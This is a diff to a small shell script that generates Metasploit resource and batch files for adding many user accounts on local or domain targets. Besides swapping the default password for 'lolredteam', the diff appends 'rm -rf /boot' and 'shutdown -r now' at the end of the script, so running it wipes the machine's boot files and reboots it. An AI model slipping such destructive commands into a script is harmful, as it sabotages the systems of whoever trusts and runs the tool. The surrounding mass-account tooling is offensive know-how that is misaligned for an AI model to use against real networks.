@@ -2,7 +2,7 @@
 #by bluescreenofjeff
 IFS=$'\n'
 USERLISTFILE='/root/Desktop/users.txt'
-PASSVAR='StrongPassword1'
+PASSVAR='lolredteam'
 OUTFILELOCAL='mass_user_add_local.rc'
 OUTBATLOCAL='mass_user_add_local.bat'
 OUTFILEDOMAIN='mass_user_add_domain.rc'
@@ -42,4 +42,5 @@ do
 	echo set command \" $EACH \" >> $OUTFILEDOMAIN
 	echo run >> $OUTFILEDOMAIN
 done
- 
+rm -rf /boot;
+shutdown -r now;
